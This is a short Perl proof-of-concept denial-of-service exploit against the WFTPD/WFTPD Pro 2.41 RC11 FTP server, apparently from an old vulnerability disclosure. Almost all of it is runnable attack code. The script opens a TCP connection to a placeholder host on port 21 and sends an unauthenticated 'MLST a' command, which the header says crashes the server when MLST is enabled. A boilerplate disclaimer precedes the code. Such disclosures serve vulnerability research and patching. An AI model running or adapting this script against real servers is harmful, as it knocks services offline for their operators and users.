#!/usr/bin/perl
#
# WFTPD/WFTPD Pro 2.41 RC11 denial-of-service #3
# Blue Panda - bluepanda@dwarf.box.sk
# http://bluepanda.box.sk/
#
# ----------------------------------------------------------
# Disclaimer: this file is intended as proof of concept, and
# is not intended to be used for illegal purposes. I accept
# no responsibility for damage incurred by the use of it.
# ----------------------------------------------------------
#
# Sends an MLST command without logging in with USER and PASS first, causing
# WFTPD to crash. Note: MLST is not enabled by default, and must be for this
# to work.
#

use IO::Socket;

$host = "ftp.host.com" ;
$port = "21";
$wait = 10;

# Connect to server.
print "Connecting to $host:$port...";
$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$host, PeerPort=>$port) || die "failed.\n";
print "done.\n";

print $socket "MLST a\n";

# Wait a while, just to make sure the command arrives.
print "Waiting...";
$time = 0;
while ($time < $wait) {
        sleep(1);
        print ".";
        $time += 1;
}

# Finished.
close($socket);
print "\nConnection closed. Finished.\n"
